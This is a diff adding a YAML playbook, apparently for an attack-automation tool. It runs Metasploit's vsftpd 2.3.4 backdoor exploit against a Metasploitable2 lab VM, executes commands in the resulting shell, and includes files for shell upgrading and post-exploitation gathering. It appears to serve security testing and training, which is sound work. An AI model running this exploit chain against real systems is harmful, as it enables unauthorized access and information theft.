@@ -1,0 +1,70 @@
+#
+# Author: Wolfgang Hotwagner
+# Description:
+#     This playbook perfoms the following attack-steps:
+#     1. Execute exploit/unix/ftp/vsftpd_234_backdoor
+#     2. Run command using the spawned session
+#     3. Set variable UPGRADESESSION to the session-name
+#     4. Perform commands to make the shell more interactive
+#     5. Run commands on the upgraded shell
+#     6. Execute multiple post-exploitation-modules to gather info
+#
+# Requirements:
+#     1. Run this on kali-linux
+#     2. Metasploit installed and msfrpd executed
+#     3. Target a Metasploitable2-VM
+#
+vars:
+  METASPLOITABLE: 172.17.0.106
+  ATTACKER: 172.17.0.127
+  PAYLOAD: cmd/unix/interact
+  INCLUDE_PATH: ./playbooks/includes
+
+commands:
+  - type: debug
+    cmd: "Please note that 'exploit/unix/ftp/vsftpd_234_backdoor' might not always work"
+
+  # Exploit backdoor in vsftpd
+  - type: msf-module
+    creates_session: shell
+    cmd: exploit/unix/ftp/vsftpd_234_backdoor
+    payload: $PAYLOAD
+    options:
+      RHOSTS: $METASPLOITABLE
+      RPORT: 21
+
+  # Run command in spawned shell
+  - type: msf-session
+    session: shell
+    cmd: id
+
+  # set variable UPGRADESESSION
+  # the included upgrade_shell.yml depends
+  # on that variable
+  - type: setvar
+    cmd: shell
+    variable: UPGRADESESSION
+
+  # include commands from an external
+  # yaml-file
+  - type: include
+    local_path: $INCLUDE_PATH/upgrade_shell.yml
+
+  # run commands using the upgraded shell
+  - type: msf-session
+    session: shell
+    cmd: ps -aux
+
+  # set variable GATHER_SESSION
+  # the included gather_commands.yml depends
+  # on that variable
+  - type: setvar
+    cmd: $LAST_MSF_SESSION
+    variable: GATHER_SESSION
+
+  # include commands and gather/loot information
+  - type: include
+    local_path: $INCLUDE_PATH/gather_commands.yml
+
+
+
